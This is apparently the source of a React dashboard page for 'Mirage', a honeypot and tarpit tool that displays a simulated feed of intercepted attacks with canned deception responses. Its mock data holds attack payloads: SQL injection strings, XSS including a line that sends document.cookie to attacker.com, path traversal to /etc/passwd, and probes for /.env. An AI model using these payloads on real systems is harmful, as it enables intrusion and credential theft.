"use client";

import React, { useState, useEffect, useMemo } from "react";
import {
  Play,
  Pause,
  Copy,
  ExternalLink,
  X,
  Check
} from "lucide-react";

// --- Types & Interfaces ---
interface ThreatLog {
  id: string;
  time: string;
  ip: string;
  vector: string;
  action: "Honeypot" | "Tarpit";
  payload: string;
  mockResponse: string;
}

// --- Static Data & Mocks ---
const MOCK_IPS = [
  "185.220.101.4",
  "45.143.203.18",
  "198.51.100.72",
  "203.0.113.111",
  "109.244.12.89",
  "82.102.23.45",
  "91.200.12.190",
  "195.154.122.31",
  "77.247.110.8"
];

const ATTACK_VECTORS = [
  {
    vector: "SQL Injection (SQLi)",
    payloads: [
      {
        payload: "UNION SELECT username, password FROM users --",
        response: "HTTP 200 OK\n\n{\n  \"status\": \"success\",\n  \"data\": []\n}\n\n(Deception: Simulated empty database 'users' returned to hide credentials)"
      },
      {
        payload: "1' OR '1'='1",
        response: "HTTP 200 OK\n\n{\n  \"status\": \"success\",\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3RfdXNlcl85MiJ9...\",\n  \"role\": \"guest_user_92\"\n}\n\n(Deception: Authentication bypassed successfully, attacker logged into virtual honeypot profile)"
      },
      {
        payload: "'; DROP TABLE logs; --",
        response: "HTTP 200 OK\n\n{\n  \"status\": \"success\",\n  \"rows_affected\": 0\n}\n\n(Deception: Action simulated on virtual logs table)"
      }
    ],
    action: "Honeypot" as const
  },
  {
    vector: "Cross-Site Scripting (XSS)",
    payloads: [
      {
        payload: "<script>alert(document.cookie)</script>",
        response: "HTTP 200 OK\n\n<html>\n  <body>\n    <!-- Sanity check: script tag sanitized and logged to sandbox -->\n    <div>Search results for: [Sanitized Script Object]</div>\n  </body>\n</html>\n\n(Deception: Sanitized element rendered in virtual DOM)"
      },
      {
        payload: "javascript:fetch('http://attacker.com/steal?c='+document.cookie)",
        response: "HTTP 200 OK\n\n(Deception: Intercepted script, served fake cookie token 'session_id=fake_f6b219e2c60')"
      }
    ],
    action: "Honeypot" as const
  },
  {
    vector: "Path Traversal",
    payloads: [
      {
        payload: "../../../etc/passwd",
        response: "HTTP 200 OK\n\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nmirage_user:x:1000:1000:Mirage Sandbox User:/home/mirage_user:/bin/bash\n\n(Deception: Served mock passwd file with fake low-privilege users)"
      },
      {
        payload: "..\\..\\..\\windows\\win.ini",
        response: "HTTP 200 OK\n\n[mail]\nMAPI=1\n[MCI Extensions]\n3g2=MPEGVideo\n\n(Deception: Served standard mock win.ini file)"
      }
    ],
    action: "Honeypot" as const
  },
  {
    vector: "Automated Bot Scanner",
    payloads: [
      {
        payload: "GET /wp-admin.php HTTP/1.1\nHost: target.com\nUser-Agent: Masscan/1.3",
        response: "Tarpit connection held.\nThrottling transmission speed to 1 Byte/second.\n\n(Deception: Target session stalled dynamically)"
      },
      {
        payload: "GET /.env HTTP/1.1\nHost: target.com\nUser-Agent: python-requests/2.28.1",
        response: "Tarpit connection held.\nThrottling transmission speed to 1 Byte/second.\n\n(Deception: Target session stalled dynamically)"
      },
      {
        payload: "GET /actuator/health HTTP/1.1\nHost: target.com\nUser-Agent: Go-http-client/1.1",
        response: "Tarpit connection held.\nThrottling transmission speed to 1 Byte/second.\n\n(Deception: Target session stalled dynamically)"
      }
    ],
    action: "Tarpit" as const
  }
];

const INITIAL_LOGS: ThreatLog[] = [
  {
    id: "log-1",
    time: "02:23:44",
    ip: "185.220.101.4",
    vector: "Automated Bot Scanner",
    action: "Tarpit",
    payload: "GET /wp-admin.php HTTP/1.1\nHost: target.com\nUser-Agent: Masscan/1.3",
    mockResponse: "Tarpit connection held. Throttling transmission speed to 1 Byte/second. (Deception: Target session stalled dynamically)"
  },
  {
    id: "log-2",
    time: "02:23:12",
    ip: "198.51.100.72",
    vector: "SQL Injection (SQLi)",
    action: "Honeypot",
    payload: "POST /api/login HTTP/1.1\nContent-Type: application/json\n\n{\"username\": \"admin' OR 1=1 --\", \"password\": \"xxxx\"}",
    mockResponse: "HTTP 200 OK\n{\n  \"status\": \"success\",\n  \"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3RfdXNlcl85MiJ9...\",\n  \"role\": \"guest_user_92\"\n}\n\n(Deception: Authentication bypassed successfully, attacker logged into virtual honeypot profile)"
  },
  {
    id: "log-3",
    time: "02:22:50",
    ip: "203.0.113.111",
    vector: "Cross-Site Scripting (XSS)",
    action: "Honeypot",
    payload: "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1",
    mockResponse: "HTTP 200 OK\n\n<html>\n  <body>\n    <!-- Sanity check: script tag sanitized and logged to sandbox -->\n    <div>Search results for: [Sanitized Script Object]</div>\n  </body>\n</html>\n\n(Deception: Sanitized element rendered in virtual DOM)"
  },
  {
    id: "log-4",
    time: "02:22:15",
    ip: "45.143.203.18",
    vector: "Automated Bot Scanner",
    action: "Tarpit",
    payload: "GET /.env HTTP/1.1\nHost: target.com\nUser-Agent: python-requests/2.28.1",
    mockResponse: "Tarpit connection held. Throttling transmission speed to 1 Byte/second. (Deception: Target session stalled dynamically)"
  },
  {
    id: "log-5",
    time: "02:21:40",
    ip: "109.244.12.89",
    vector: "Path Traversal",
    action: "Honeypot",
    payload: "GET /api/download?file=../../../../etc/passwd HTTP/1.1",
    mockResponse: "HTTP 200 OK\n\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nmirage_user:x:1000:1000:Mirage Sandbox User:/home/mirage_user:/bin/bash\n\n(Deception: Served mock passwd file with fake low-privilege users)"
  }
];

export default function Home() {
  // --- States ---
  const [logs, setLogs] = useState<ThreatLog[]>(INITIAL_LOGS);
  const [isStreaming, setIsStreaming] = useState(true);
  const [feedFilter, setFeedFilter] = useState<"All" | "Honeypot" | "Tarpit">("All");
  const [selectedLog, setSelectedLog] = useState<ThreatLog | null>(null);
  const [copiedState, setCopiedState] = useState(false);

  // --- Live Threat Log Stream Simulation ---
  useEffect(() => {
    if (!isStreaming) return;

    const interval = setInterval(() => {
      const randomIp = MOCK_IPS[Math.floor(Math.random() * MOCK_IPS.length)];
      const vectorData = ATTACK_VECTORS[Math.floor(Math.random() * ATTACK_VECTORS.length)];
      const payloadData = vectorData.payloads[Math.floor(Math.random() * vectorData.payloads.length)];

      const now = new Date();
      const timeString = now.toTimeString().split(" ")[0];

      const newLog: ThreatLog = {
        id: `log-${Date.now()}`,
        time: timeString,
        ip: randomIp,
        vector: vectorData.vector,
        action: vectorData.action,
        payload: payloadData.payload,
        mockResponse: payloadData.response
      };

      setLogs((prev) => [newLog, ...prev.slice(0, 14)]);
    }, 3500);

    return () => clearInterval(interval);
  }, [isStreaming]);

  // --- Helpers ---
  const handleCopyPayload = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedState(true);
    setTimeout(() => setCopiedState(false), 2000);
  };

  const filteredLogs = useMemo(() => {
    if (feedFilter === "All") return logs;
    return logs.filter((log) => log.action === feedFilter);
  }, [logs, feedFilter]);

  return (
    <div className="min-h-screen bg-[#F7F7F8] text-[#0D0D0D] font-sans antialiased selection:bg-neutral-200">

      {/* 1. TOP BAR */}
      <header className="sticky top-0 z-30 w-full bg-white border-b border-[#E5E5E5] px-6 py-4">
        <div className="max-w-5xl mx-auto flex items-center justify-between">
          <h1 className="text-md font-semibold tracking-tight text-[#0D0D0D]">Mirage</h1>
        </div>
      </header>

      {/* MAIN CONTAINER */}
      <main className="max-w-5xl mx-auto p-6">

        {/* LIVE THREAT INTERCEPTION FEED */}
        <section className="bg-white border border-[#E5E5E5] rounded-lg overflow-hidden flex flex-col">

          {/* Feed Header Controls */}
          <div className="p-5 border-b border-[#E5E5E5] flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <h2 className="text-md font-semibold text-[#0D0D0D]">Live Threat Interception Feed</h2>
                <span className="relative flex h-2 w-2">
                  {isStreaming && (
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-neutral-600 opacity-75"></span>
                  )}
                  <span className={`relative inline-flex rounded-full h-2 w-2 ${isStreaming ? "bg-neutral-800" : "bg-neutral-300"}`}></span>
                </span>
              </div>
              <p className="text-xs text-[#5D5D5D]">Real-time detection events captured by Edge Gateway</p>
            </div>

            {/* Pause/Resume & Stream Filter */}
            <div className="flex items-center gap-2 self-start sm:self-auto">

              {/* Filter Selector */}
              <div className="inline-flex rounded-md border border-[#E5E5E5] p-1 bg-[#F7F7F8] text-xs font-mono">
                {(["All", "Honeypot", "Tarpit"] as const).map((filter) => (
                  <button
                    key={filter}
                    onClick={() => setFeedFilter(filter)}
                    className={`px-2.5 py-1 rounded transition-colors ${feedFilter === filter
                      ? "bg-white text-black shadow-xs font-medium"
                      : "text-[#5D5D5D] hover:text-black"
                      }`}
                  >
                    {filter}
                  </button>
                ))}
              </div>

              {/* Pause/Resume Button */}
              <button
                onClick={() => setIsStreaming(!isStreaming)}
                className="inline-flex items-center gap-1.5 bg-black text-white hover:bg-neutral-800 px-3 py-1.5 rounded text-xs font-mono font-medium transition-colors cursor-pointer"
              >
                {isStreaming ? (
                  <>
                    <Pause className="h-3 w-3" />
                    <span>Pause Feed</span>
                  </>
                ) : (
                  <>
                    <Play className="h-3 w-3" />
                    <span>Resume</span>
                  </>
                )}
              </button>

            </div>
          </div>

          {/* Feed Table */}
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-[#E5E5E5] bg-neutral-50 text-xs font-mono text-[#5D5D5D] uppercase tracking-wider">
                  <th className="py-3 px-5 font-medium">Time</th>
                  <th className="py-3 px-5 font-medium">Source IP</th>
                  <th className="py-3 px-5 font-medium">Attack Vector</th>
                  <th className="py-3 px-5 font-medium">Routing Action</th>
                  <th className="py-3 px-5 font-medium text-right">Payload Analysis</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#EFEFEF] text-xs font-mono">
                {filteredLogs.length === 0 ? (
                  <tr>
                    <td colSpan={5} className="py-8 px-5 text-center text-[#5D5D5D]">
                      No threats captured matching the active filter.
                    </td>
                  </tr>
                ) : (
                  filteredLogs.map((log) => (
                    <tr
                      key={log.id}
                      className="hover:bg-neutral-50/60 transition-colors animate-fade-in"
                    >
                      <td className="py-3.5 px-5 text-[#5D5D5D]">{log.time}</td>
                      <td className="py-3.5 px-5 font-medium text-[#0D0D0D]">{log.ip}</td>
                      <td className="py-3.5 px-5 text-[#0D0D0D]">{log.vector}</td>
                      <td className="py-3.5 px-5">
                        <span
                          className={`inline-flex items-center px-2 py-0.5 rounded text-[10px] font-mono border ${log.action === "Tarpit"
                            ? "bg-neutral-900 text-white border-neutral-900"
                            : "bg-neutral-50 text-neutral-800 border-[#E5E5E5]"
                            }`}
                        >
                          {log.action}
                        </span>
                      </td>
                      <td className="py-3.5 px-5 text-right">
                        <button
                          onClick={() => setSelectedLog(log)}
                          className="inline-flex items-center gap-1 text-xs text-neutral-800 hover:text-black hover:underline cursor-pointer"
                        >
                          <span>Inspect Payload</span>
                          <ExternalLink className="h-3 w-3" />
                        </button>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>

          {/* Feed Footer */}
          <div className="p-4 border-t border-[#E5E5E5] bg-neutral-50 flex items-center justify-between text-xs text-[#5D5D5D] font-mono">
            <span>Showing {filteredLogs.length} recent logs</span>
            <span>Sandbox Logging: Raw payload recording</span>
          </div>

        </section>
      </main>

      {/* DECEPTION PAYLOAD INSPECTOR MODAL */}
      {selectedLog && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-neutral-900/30 backdrop-blur-xs transition-opacity"
          onClick={() => setSelectedLog(null)}
        >
          <div
            className="w-full max-w-2xl bg-white border border-[#E5E5E5] rounded-lg shadow-xl overflow-hidden flex flex-col animate-scale-up"
            onClick={(e) => e.stopPropagation()}
            role="dialog"
            aria-modal="true"
          >
            {/* Modal Header */}
            <div className="px-5 py-4 border-b border-[#E5E5E5] flex items-center justify-between">
              <div>
                <h4 className="text-sm font-semibold text-[#0D0D0D]">Threat Payload Inspector</h4>
                <p className="text-xs text-[#5D5D5D] font-mono">
                  Event: {selectedLog.id} // Source: {selectedLog.ip}
                </p>
              </div>
              <button
                onClick={() => setSelectedLog(null)}
                className="text-[#5D5D5D] hover:text-black p-1 rounded hover:bg-neutral-100 transition-colors cursor-pointer"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            {/* Modal Body */}
            <div className="p-5 space-y-4 max-h-[70vh] overflow-y-auto">

              {/* Event Metadata grid */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 bg-neutral-50 p-4 border border-[#E5E5E5] rounded text-xs font-mono">
                <div>
                  <span className="text-[#5D5D5D] block text-[10px] uppercase">Timestamp</span>
                  <span className="font-semibold text-neutral-800">{selectedLog.time}</span>
                </div>
                <div>
                  <span className="text-[#5D5D5D] block text-[10px] uppercase">Source IP</span>
                  <span className="font-semibold text-neutral-800">{selectedLog.ip}</span>
                </div>
                <div>
                  <span className="text-[#5D5D5D] block text-[10px] uppercase">Attack Vector</span>
                  <span className="font-semibold text-neutral-800">{selectedLog.vector}</span>
                </div>
                <div>
                  <span className="text-[#5D5D5D] block text-[10px] uppercase">Action Route</span>
                  <span className="font-semibold text-neutral-800">{selectedLog.action}</span>
                </div>
              </div>

              {/* Raw Payload Section */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between text-xs font-mono text-[#5D5D5D]">
                  <span>RAW INTERCEPTED PAYLOAD</span>
                  <button
                    onClick={() => handleCopyPayload(selectedLog.payload)}
                    className="inline-flex items-center gap-1 text-neutral-800 hover:text-black hover:underline cursor-pointer"
                  >
                    {copiedState ? (
                      <>
                        <Check className="h-3 w-3 text-neutral-600" />
                        <span>Copied</span>
                      </>
                    ) : (
                      <>
                        <Copy className="h-3 w-3" />
                        <span>Copy Code</span>
                      </>
                    )}
                  </button>
                </div>
                <div className="bg-neutral-900 text-neutral-100 p-4 rounded text-xs font-mono overflow-x-auto border border-neutral-800 max-h-40">
                  <pre>{selectedLog.payload}</pre>
                </div>
              </div>

              {/* Sandbox Response Section */}
              <div className="space-y-1.5">
                <span className="text-xs font-mono text-[#5D5D5D] block uppercase">
                  SIMULATED DECEPTION RESPONSE
                </span>
                <div className="bg-neutral-50 text-neutral-800 p-4 rounded text-xs font-mono overflow-x-auto border border-[#E5E5E5] max-h-48">
                  <pre className="whitespace-pre-wrap">{selectedLog.mockResponse}</pre>
                </div>
              </div>

            </div>

            {/* Modal Footer */}
            <div className="px-5 py-3.5 bg-neutral-50 border-t border-[#E5E5E5] flex items-center justify-between text-xs font-mono">
              <span className="text-[#5D5D5D]">
                Deception: Active
              </span>
              <button
                onClick={() => setSelectedLog(null)}
                className="bg-black text-white hover:bg-neutral-800 px-4 py-2 rounded text-xs font-mono font-medium transition-colors cursor-pointer"
              >
                Close Analysis
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
